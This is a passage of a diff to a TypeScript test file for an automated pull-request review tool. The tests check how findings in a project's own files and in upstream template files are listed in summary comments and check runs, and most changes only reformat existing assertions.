-    assert.deepEqual(result.dropped.map((d) => [d.finding.title, d.file]), [['Claim', 'AGENTS.md']]);
+    const result = await review({
+      run: { provider: 'bedrock', proxyUrl: 'http://127.0.0.1:1' },
+      gathered,
+      charters,
+      log: () => {},
+      agent,
+    });
+    assert.deepEqual(
+      result.findings.map((f) => [f.id, f.file, f.title]),
+      [['F1', 'AGENTS.md', 'draft: no']],
+    );
+    assert.deepEqual(
+      result.upstream.map((f) => [f.id, f.file, f.line, f.title]),
+      [['U1', '.template/Get-PlanState.ps1', 155, 'Empty catch']],
+    );
+    assert.deepEqual(
+      result.dropped.map((d) => [d.finding.title, d.file]),
+      [['Claim', 'AGENTS.md']],
+    );
     assert.equal(result.verdict, 'comment');
   } finally {
     if (saved === undefined) delete process.env['CODE_REVIEW_VERIFICATION'];
@@ -468,35 +731,84 @@ test('review leaves out a template finding that says a changed file isn\'t chang
   }
 });
 
-test('the summary lists the template\'s findings once, under the template\'s repository, with file and line', () => {
-  const upstream: ReviewedFinding[] = [{ ...finding('.template/Get-PlanState.ps1', 155, 'should-fix', 'Empty catch'), id: 'U1', reviewers: ['hygiene'] }];
+test("the summary lists the template's findings once, under the template's repository, with file and line", () => {
+  const upstream: ReviewedFinding[] = [
+    { ...finding('.template/Get-PlanState.ps1', 155, 'should-fix', 'Empty catch'), id: 'U1', reviewers: ['hygiene'] },
+  ];
   const results = {
-    repository: 'o/r', pullRequest: 23, headSha: 'a'.repeat(40), provider: 'bedrock', providerReason: '', summary: 'Adopts the template.',
-    verdict: 'comment', findings: [], upstream, dropped: [], template: 'NCodeGroup/project-template', reviewers: [], skipped: [], synthesisModel: '',
-    calls: [], costUsd: 0, durationMs: 0, notShown: [], changedLines: {},
+    repository: 'o/r',
+    pullRequest: 23,
+    headSha: 'a'.repeat(40),
+    provider: 'bedrock',
+    providerReason: '',
+    summary: 'Adopts the template.',
+    verdict: 'comment',
+    findings: [],
+    upstream,
+    dropped: [],
+    template: 'NCodeGroup/project-template',
+    reviewers: [],
+    skipped: [],
+    synthesisModel: '',
+    calls: [],
+    costUsd: 0,
+    durationMs: 0,
+    notShown: [],
+    changedLines: {},
   } as Results;
   const body = summaryComment(results, 'https://check', 'https://help');
   assert.match(body, /<summary>Belongs upstream, in NCodeGroup\/project-template \(1\)<\/summary>/);
   assert.match(body, /Trial: findings in this repository's files are posted as review threads/);
   assert.match(body, /- 🟠 `\.template\/Get-PlanState\.ps1:155`: Empty catch/);
-  assert.match(checkText(results), /### Belongs upstream, in NCodeGroup\/project-template\n\n- \*\*U1 Should fix\*\* `\.template\/Get-PlanState\.ps1:155`/);
-  assert.match(checkSummary(results), /1 finding in the template's files belongs upstream, in NCodeGroup\/project-template/);
-  assert.doesNotMatch(summaryComment({ ...results, upstream: [] }, 'https://check', 'https://help'), /Belongs upstream|in this repository's files/);
+  assert.match(
+    checkText(results),
+    /### Belongs upstream, in NCodeGroup\/project-template\n\n- \*\*U1 Should fix\*\* `\.template\/Get-PlanState\.ps1:155`/,
+  );
+  assert.match(
+    checkSummary(results),
+    /1 finding in the template's files belongs upstream, in NCodeGroup\/project-template/,
+  );
+  assert.doesNotMatch(
+    summaryComment({ ...results, upstream: [] }, 'https://check', 'https://help'),
+    /Belongs upstream|in this repository's files/,
+  );
 });
 
-test('the summary and check run count every upstream finding, and say how many past the limit aren\'t listed', () => {
+test("the summary and check run count every upstream finding, and say how many past the limit aren't listed", () => {
   const upstream: ReviewedFinding[] = [
     { ...finding('.template/Get-PlanState.ps1', 155, 'should-fix', 'Empty catch'), id: 'U1', reviewers: ['hygiene'] },
     { ...finding('.githooks/pre-push', 25), id: 'U2', reviewers: ['tests'] },
   ];
   const results = {
-    repository: 'o/r', pullRequest: 23, headSha: 'a'.repeat(40), provider: 'bedrock', providerReason: '', summary: 'Adopts the template.',
-    verdict: 'comment', findings: [], upstream, dropped: [], template: 'NCodeGroup/project-template', reviewers: [], skipped: [], synthesisModel: '',
-    calls: [], costUsd: 0, durationMs: 0, notShown: [], changedLines: {},
+    repository: 'o/r',
+    pullRequest: 23,
+    headSha: 'a'.repeat(40),
+    provider: 'bedrock',
+    providerReason: '',
+    summary: 'Adopts the template.',
+    verdict: 'comment',
+    findings: [],
+    upstream,
+    dropped: [],
+    template: 'NCodeGroup/project-template',
+    reviewers: [],
+    skipped: [],
+    synthesisModel: '',
+    calls: [],
+    costUsd: 0,
+    durationMs: 0,
+    notShown: [],
+    changedLines: {},
   } as Results;
-  assert.match(checkSummary(results), /2 findings in the template's files belong upstream, in NCodeGroup\/project-template, and aren't posted as threads\.$/m);
+  assert.match(
+    checkSummary(results),
+    /2 findings in the template's files belong upstream, in NCodeGroup\/project-template, and aren't posted as threads\.$/m,
+  );
   const cut = { ...results, upstreamOmitted: 3 };
-  assert.match(summaryComment(cut, 'https://check', 'https://help'), /Belongs upstream, in NCodeGroup\/project-template \(5\)<\/summary>[\s\S]*- And 3 more on other lines of the template's files, not listed\./);
+  assert.match(
+    summaryComment(cut, 'https://check', 'https://help'),
+    /Belongs upstream, in NCodeGroup\/project-template \(5\)<\/summary>[\s\S]*- And 3 more on other lines of the template's files, not listed\./,
+  );
   assert.match(checkSummary(cut), /5 findings in the template's files belong upstream, .* The first 2 are listed\./);
   assert.match(checkText(cut), /- And 3 more on other lines of the template's files, not listed\./);
 });
